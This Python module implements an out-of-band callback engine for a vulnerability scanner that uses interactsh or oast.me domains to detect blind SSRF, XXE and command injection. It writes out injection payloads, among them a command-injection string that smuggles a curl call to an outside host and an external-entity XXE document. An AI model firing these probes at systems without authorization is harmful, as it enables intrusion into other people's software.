"""
oob_engine.py — Out-of-Band (OOB) Callback Automation Engine for OneInfinity

Manages OOB interaction domains and payloads for detecting blind vulnerabilities:
  - SSRF (Server-Side Request Forgery)
  - XXE (XML External Entity injection)
  - Command injection (cmdi)
  - Generic OOB probes

Tries to integrate with interactsh-client if installed; falls back to a
deterministic interaction.sh domain derived from the scan ID so that the
operator can check callbacks manually.

Usage::

    engine = OOBEngine(scan_id="abc123")
    domain = engine.start()
    ssrf_payload = engine.get_payload("ssrf")
    # ... inject payload into target requests ...
    hits = engine.poll_interactions(timeout_s=30)
    engine.stop()
"""

from __future__ import annotations

import json
import logging
import re
import shutil
import subprocess
import threading
import time
import uuid
from typing import Dict, List, Optional

log = logging.getLogger("oi.oob_engine")

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

_INTERACTSH_BINARY = "interactsh-client"
_POLL_INTERVAL_S = 3
_OAST_BASE = "oast.me"


# ---------------------------------------------------------------------------
# Engine
# ---------------------------------------------------------------------------

class OOBEngine:
    """
    Out-of-Band callback automation engine.

    Parameters
    ----------
    scan_id : str | None
        Unique identifier for this scan run; embedded in the OOB domain so
        callbacks can be correlated to a specific scan.
    """

    def __init__(self, scan_id: Optional[str] = None) -> None:
        self.scan_id: str = scan_id or uuid.uuid4().hex[:12]
        self.oob_domain: Optional[str] = None
        self._interactsh_available: bool = False
        self._fallback_mode: bool = False  # True when using static domain (no interactsh)
        self._interactsh_proc: Optional[subprocess.Popen] = None
        self._interactions: List[dict] = []
        self._interactions_lock = threading.Lock()
        self._poll_thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()
        self._output_file: Optional[str] = None
        # Payload registry: uid -> {type, url, timestamp, context}
        self._payload_registry: Dict[str, dict] = {}
        self._registry_lock = threading.Lock()

    # ------------------------------------------------------------------ #
    # Lifecycle
    # ------------------------------------------------------------------ #

    def start(self) -> str:
        """
        Start OOB listener.

        Tries to launch interactsh-client if it is on PATH.  On failure
        (binary missing, port conflict, etc.) falls back to a static
        ``{scan_id}.{_OAST_BASE}`` domain — the operator must poll the
        public OAST service manually.

        Returns
        -------
        str
            The OOB domain to embed in payloads.
        """
        self._interactsh_available = bool(shutil.which(_INTERACTSH_BINARY))

        if self._interactsh_available:
            try:
                self._start_interactsh()
            except Exception as exc:
                log.warning("interactsh-client start failed (%s) — using static domain", exc)
                self._interactsh_available = False

        if not self._interactsh_available or not self.oob_domain:
            self.oob_domain = f"{self.scan_id}.{_OAST_BASE}"
            self._fallback_mode = True
            log.info("OOB domain (static fallback): %s", self.oob_domain)
        else:
            self._fallback_mode = False

        return self.oob_domain

    def _start_interactsh(self) -> None:
        """Launch interactsh-client as a background subprocess and parse its domain."""
        import tempfile
        self._output_file = tempfile.mktemp(suffix=".txt", prefix="interactsh_")
        cmd = [
            _INTERACTSH_BINARY,
            "-output", self._output_file,
            "-json",
            "-no-color",
        ]
        log.info("Launching interactsh: %s", " ".join(cmd))
        self._interactsh_proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        # Give it up to 5 s to print its domain
        deadline = time.time() + 5
        while time.time() < deadline:
            line = self._interactsh_proc.stdout.readline()
            if not line:
                time.sleep(0.1)
                continue
            # interactsh prints something like: "[INF] Listening on xyz.oast.fun"
            if "listening" in line.lower() or "interact.sh" in line.lower() or "oast" in line.lower():
                # Extract domain-like token
                parts = line.strip().split()
                for part in parts:
                    if "." in part and not part.startswith("["):
                        self.oob_domain = part.strip(". ")
                        log.info("interactsh domain: %s", self.oob_domain)
                        self._interactsh_available = True
                        # Start polling thread
                        self._stop_event.clear()
                        self._poll_thread = threading.Thread(
                            target=self._poll_loop,
                            daemon=True,
                            name="oob-poll",
                        )
                        self._poll_thread.start()
                        return
        raise RuntimeError("interactsh-client did not emit a domain within 5 s")

    def stop(self) -> None:
        """Terminate interactsh-client subprocess and background poll thread."""
        self._stop_event.set()
        if self._interactsh_proc:
            try:
                self._interactsh_proc.terminate()
                self._interactsh_proc.wait(timeout=5)
            except Exception as exc:
                log.debug("Error stopping interactsh: %s", exc)
            self._interactsh_proc = None
        if self._poll_thread and self._poll_thread.is_alive():
            self._poll_thread.join(timeout=5)
        log.info("OOBEngine stopped")

    # ------------------------------------------------------------------ #
    # Payload generation
    # ------------------------------------------------------------------ #

    def get_payload(self, probe_type: str, **kwargs) -> str:
        """
        Return a ready-to-inject probe string containing the OOB domain.

        Each call generates a unique UID embedded in the URL path so that
        callbacks can be correlated back to the originating request via
        :meth:`correlate`.

        Parameters
        ----------
        probe_type : str
            One of: ``"ssrf"``, ``"xxe"``, ``"cmdi"``, ``"generic"``
        **kwargs
            Optional ``context`` dict stored in the payload registry for
            later correlation (e.g. ``context={"url": url, "param": "url"}``).

        Returns
        -------
        str
            Probe payload string.
        """
        if not self.oob_domain:
            self.start()

        uid = uuid.uuid4().hex[:8]
        domain = self.oob_domain

        # Register this payload so callbacks can be correlated later
        with self._registry_lock:
            self._payload_registry[uid] = {
                "uid": uid,
                "type": probe_type,
                "domain": domain,
                "timestamp": time.time(),
                "context": kwargs.get("context", {}),
            }

        if probe_type == "ssrf":
            return f"http://{domain}/ssrf-{uid}"
        elif probe_type == "xxe":
            return self.make_xxe_payload(f"http://{domain}/xxe-{uid}")
        elif probe_type == "cmdi":
            return f"; curl http://{domain}/cmdi-{uid} #"
        elif probe_type == "generic":
            return f"http://{domain}/probe-{uid}"
        else:
            log.warning("Unknown probe_type '%s'; returning generic OOB URL", probe_type)
            return f"http://{domain}/probe-{uid}"

    def make_ssrf_payload(self, url: str) -> str:
        """
        Build a SSRF probe URL that uses the OOB domain as the backend host,
        wrapping *url* as the value of a ``url`` query parameter so the
        target server will fetch it and generate an OOB callback.

        Parameters
        ----------
        url : str
            The original URL to wrap / replace with the OOB probe.

        Returns
        -------
        str
            SSRF probe URL containing OOB domain.
        """
        if not self.oob_domain:
            self.start()
        uid = uuid.uuid4().hex[:8]
        return f"http://{self.oob_domain}/ssrf-{uid}?original={url}"

    def make_xxe_payload(self, oob_url: str) -> str:
        """
        Return an XML document with an ENTITY pointing to *oob_url*.

        The payload uses a parameter entity to trigger a DNS + HTTP callback
        when parsed by a vulnerable XML processor.

        Parameters
        ----------
        oob_url : str
            The OOB HTTP URL to fetch (e.g. ``http://abc123.oast.me/xxe-1``).

        Returns
        -------
        str
            XML string with out-of-band XXE payload.
        """
        return (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{oob_url}"> %xxe;]>\n'
            '<foo>&xxe;</foo>'
        )

    # ------------------------------------------------------------------ #
    # Interaction polling
    # ------------------------------------------------------------------ #

    def poll_interactions(self, timeout_s: int = 30) -> List[dict]:
        """
        Poll for OOB DNS/HTTP callbacks.

        If interactsh is running, waits up to *timeout_s* seconds watching
        the shared interactions list populated by the background poll thread.
        Falls back to reading the interactsh output file if the poll thread
        is not active.  Returns an empty list when interactsh is unavailable.

        Parameters
        ----------
        timeout_s : int
            Maximum number of seconds to wait for at least one hit.

        Returns
        -------
        List[dict]
            Each entry has: ``protocol``, ``unique_id``, ``full_id``,
            ``raw_request``, ``remote_address``, ``timestamp``.
        """
        if not self._interactsh_available:
            log.debug("interactsh not available; poll_interactions returns empty list")
            return []

        # If background poll thread is running, wait for hits
        deadline = time.time() + timeout_s
        while time.time() < deadline:
            with self._interactions_lock:
                if self._interactions:
                    return list(self._interactions)
            time.sleep(_POLL_INTERVAL_S)

        # Try reading output file as a last resort
        if self._output_file:
            try:
                import os
                if os.path.exists(self._output_file):
                    hits = []
                    with open(self._output_file) as fh:
                        for line in fh:
                            line = line.strip()
                            if not line:
                                continue
                            try:
                                hits.append(json.loads(line))
                            except ValueError:
                                hits.append({"raw": line})
                    return hits
            except Exception as exc:
                log.debug("Failed reading interactsh output file: %s", exc)

        return []

    def correlate(self, interaction: dict) -> Optional[dict]:
        """
        Attempt to match an OOB interaction callback back to a registered payload.

        Extracts the UID from the interaction's ``full_id`` or ``raw_request``
        field and looks it up in :attr:`_payload_registry`.

        Parameters
        ----------
        interaction : dict
            An interaction event as returned by interactsh (keys: ``full_id``,
            ``raw_request``, ``protocol``, ``remote_address``, ``timestamp``).

        Returns
        -------
        dict | None
            The registry entry if matched, enriched with the interaction data.
            Returns ``None`` if the UID cannot be found in the registry.
        """
        # Try to extract uid from full_id or raw_request URL path
        uid = None
        full_id = interaction.get("full_id", "")
        raw_request = interaction.get("raw_request", "")

        # Pattern: /(ssrf|xxe|cmdi|probe)-<8hex> in URL path
        _uid_pat = re.compile(r"/(?:ssrf|xxe|cmdi|probe)-([0-9a-f]{8})", re.IGNORECASE)
        for text in (full_id, raw_request):
            m = _uid_pat.search(text)
            if m:
                uid = m.group(1).lower()
                break

        if not uid:
            log.debug("correlate: could not extract UID from interaction")
            return None

        with self._registry_lock:
            entry = self._payload_registry.get(uid)

        if entry is None:
            log.debug("correlate: UID '%s' not found in payload registry", uid)
            return None

        correlated = dict(entry)
        correlated["interaction"] = interaction
        correlated["confirmed"] = True
        correlated["protocol"] = interaction.get("protocol", "unknown")
        correlated["remote_address"] = interaction.get("remote_address", "")
        correlated["callback_timestamp"] = interaction.get("timestamp", "")
        log.info(
            "OOB correlation: uid=%s type=%s confirmed from %s",
            uid, entry["type"], correlated["remote_address"],
        )
        return correlated

    def get_correlated_findings(self, poll_timeout_s: int = 30) -> List[dict]:
        """
        Poll for OOB callbacks, correlate each with its registered payload,
        and return structured findings.

        When in fallback (static domain) mode the callbacks cannot be
        automatically collected; findings are returned marked ``unverified=True``
        so the analyst knows to check the OAST service manually.

        Parameters
        ----------
        poll_timeout_s : int
            How long to poll interactsh for callbacks.

        Returns
        -------
        List[dict]
            Each finding has: ``uid``, ``type``, ``context``, ``confirmed``,
            ``unverified``, ``protocol``, ``remote_address``, ``timestamp``.
        """
        findings: List[dict] = []

        if self._fallback_mode:
            # Static domain — we can't receive callbacks automatically.
            # Return one finding per registered payload, marked unverified.
            with self._registry_lock:
                registry_copy = dict(self._payload_registry)
            for uid, entry in registry_copy.items():
                findings.append({
                    "uid": uid,
                    "type": entry["type"],
                    "context": entry.get("context", {}),
                    "domain": entry["domain"],
                    "confirmed": False,
                    "unverified": True,
                    "note": (
                        f"interactsh unavailable; manually check {entry['domain']} "
                        f"for callbacks containing /{entry['type']}-{uid}"
                    ),
                })
            return findings

        interactions = self.poll_interactions(timeout_s=poll_timeout_s)
        for interaction in interactions:
            correlated = self.correlate(interaction)
            if correlated:
                findings.append({
                    "uid": correlated["uid"],
                    "type": correlated["type"],
                    "context": correlated.get("context", {}),
                    "domain": correlated["domain"],
                    "confirmed": True,
                    "unverified": False,
                    "protocol": correlated["protocol"],
                    "remote_address": correlated["remote_address"],
                    "callback_timestamp": correlated["callback_timestamp"],
                })
            else:
                # Interaction received but could not be matched to a payload
                findings.append({
                    "uid": None,
                    "type": "unknown",
                    "context": {},
                    "domain": self.oob_domain,
                    "confirmed": True,
                    "unverified": False,
                    "protocol": interaction.get("protocol", "unknown"),
                    "remote_address": interaction.get("remote_address", ""),
                    "callback_timestamp": interaction.get("timestamp", ""),
                })
        return findings

    def _poll_loop(self) -> None:
        """Background thread: continuously read interactsh stdout for JSON events."""
        proc = self._interactsh_proc
        if not proc:
            return
        while not self._stop_event.is_set():
            try:
                line = proc.stdout.readline()
                if not line:
                    time.sleep(0.2)
                    continue
                line = line.strip()
                if not line:
                    continue
                try:
                    event = json.loads(line)
                    with self._interactions_lock:
                        self._interactions.append(event)
                    log.info("OOB interaction: %s", json.dumps(event)[:200])
                except ValueError:
                    log.debug("Non-JSON interactsh line: %s", line[:120])
            except Exception as exc:
                log.debug("OOB poll loop error: %s", exc)
                time.sleep(1)


# ---------------------------------------------------------------------------
# CLI entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import argparse
    import sys

    logging.basicConfig(level=logging.INFO, format="%(levelname)s %(name)s %(message)s")

    parser = argparse.ArgumentParser(description="OOB Callback Engine")
    parser.add_argument("--scan-id", default=None, help="Scan ID to embed in OOB domain")
    parser.add_argument(
        "--probe-type",
        default="ssrf",
        choices=["ssrf", "xxe", "cmdi", "generic"],
        help="Payload probe type to demonstrate",
    )
    parser.add_argument(
        "--poll",
        type=int,
        default=0,
        help="Poll for interactions for N seconds (0 = skip)",
    )
    args = parser.parse_args()

    engine = OOBEngine(scan_id=args.scan_id)
    domain = engine.start()
    print(f"[+] OOB domain: {domain}")

    payload = engine.get_payload(args.probe_type)
    print(f"[+] {args.probe_type.upper()} payload:\n{payload}\n")

    print(f"[+] SSRF probe URL: {engine.make_ssrf_payload('http://internal-service/')}")
    print(f"[+] XXE payload:\n{engine.make_xxe_payload(f'http://{domain}/xxe-demo')}\n")

    if args.poll > 0:
        print(f"[*] Polling for interactions ({args.poll}s) ...")
        hits = engine.poll_interactions(timeout_s=args.poll)
        print(f"[+] {len(hits)} interaction(s) received")
        for h in hits:
            print(f"    {json.dumps(h)[:160]}")

    engine.stop()
    print("[+] OOBEngine stopped.")
